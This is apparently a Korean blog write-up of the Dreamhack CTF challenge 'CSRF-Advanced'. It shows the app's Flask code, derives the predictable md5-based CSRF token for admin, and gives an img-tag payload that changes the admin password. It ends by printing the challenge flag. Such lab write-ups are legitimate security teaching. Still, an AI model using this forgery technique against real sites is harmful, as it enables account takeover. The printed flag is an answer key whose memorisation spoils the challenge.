---
title: "[Dreamhack] CSRF-Advanced 해설"
author: jyp
date: 2026-06-09 12:00:04 +0900
categories: [Dreamhack]
tags: [dreamhack , WebHacking]
math: true
---

# 문제 특징

> CSRF 해킹 기법을 이용하여 어드민 비밀번호 바꾸기

## **난이도**: Lv.1
## **카테고리**: 웹해킹

---

# 문제 구조

## 문제파일구성

```
/
├── deploy
│   ├── app.py
│   ├── flag.txt
│   ├── requirements.txt
│   ├── static
│   └── templates
└── Dockerfile
```

## 주요 코드 

```python

#app.py

@app.route("/")
def index():
    session_id = request.cookies.get('sessionid', None)
    try:
        username = session_storage[session_id]
    except KeyError:
        return render_template('index.html', text='please login')

    return render_template('index.html', text=f'Hello {username}, {"flag is " + FLAG if username == "admin" else "you are not an admin"}')


@app.route("/flag", methods=["GET", "POST"])
def flag():
    if request.method == "GET":
        return render_template("flag.html")
    elif request.method == "POST":
        param = request.form.get("param", "")
        if not check_csrf(param):
            return '<script>alert("wrong??");history.go(-1);</script>'

        return '<script>alert("good");history.go(-1);</script>'


@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return render_template('login.html')
    elif request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        try:
            pw = users[username]
        except:
            return '<script>alert("user not found");history.go(-1);</script>'
        if pw == password:
            resp = make_response(redirect(url_for('index')) )
            session_id = os.urandom(8).hex()
            session_storage[session_id] = username
            token_storage[session_id] = md5((username + request.remote_addr).encode()).hexdigest()
            resp.set_cookie('sessionid', session_id)
            return resp 
        return '<script>alert("wrong password");history.go(-1);</script>'


@app.route("/change_password")
def change_password():
    session_id = request.cookies.get('sessionid', None)
    try:
        username = session_storage[session_id]
        csrf_token = token_storage[session_id]
    except KeyError:
        return render_template('index.html', text='please login')
    pw = request.args.get("pw", None)
    if pw == None:
        return render_template('change_password.html', csrf_token=csrf_token)
    else:
        if csrf_token != request.args.get("csrftoken", ""):
            return '<script>alert("wrong csrf token");history.go(-1);</script>'
        users[username] = pw
        return '<script>alert("Done");history.go(-1);</script>'


```

이 문제는 문제의 제목 그대로 `CSRF` 해킹 기법을 활용하여 푸는 문제로, [csrf-2](https://1221jyp.com/posts/Dreamhack_CSRF-Advanced/)와 똑같은 문제이지만, 가장 큰 다름점으로는 `csrf_token`이 걸려있다는 점이다.

# 풀이

## CSRF 토큰이란? By claude code

**CSRF 토큰은 "이 요청이 진짜 우리 사이트의 정상 폼에서 나온 것인지" 확인하기 위한 예측 불가능한 랜덤 비밀값입니다.**

>왜 필요한가?

브라우저는 요청 시 쿠키를 자동 첨부합니다. 그래서 쿠키만으로는 "정상 요청"과 "공격자가 유도한 위조 요청"을 구분할 수 없습니다.

## 고정된 csrf_token

```python
token_storage[session_id] = md5((username + request.remote_addr).encode()).hexdigest()
```

csrf_token이 제대로 작동하기 위해선 서버에서 항상 랜덤한 token값을 client에게 보내주어야 하지만, 현재 이 서버에서 전송하고 있는 csrf_token 유저별로 고정된 값임을 확인해볼 수 있다.
따라서, 어드민의 id와 ip주소를 알고있다면 csrf_token을 탈취 할 수 있는 것이다.

id : admin
address : 127.0.0.1 
이므로

파이썬 창을 열어 csrf_token값을 얻어준다.

```python
print(md5(("admin" + "127.0.0.1").encode()).hexdigest())
```

>> 7505b9c72ab4aa94b1a4ed7b207b67fb

## 페이로드

```html
<img src="/change_password?pw=1234&csrftoken=7505b9c72ab4aa94b1a4ed7b207b67fb">
```

해당 페이로드를 `/flag`의 `<input>` 박스에 넣고 전송하면 어드민의 비밀번호가 바뀌게 된다.

## 어드민 로그인

이제 로그인 창으로 이동하여
id : admin
pw : 1234
를 입력해보자.


# 정답

DH{77bb582329a1b2fc9f8dc2a50b70d586}
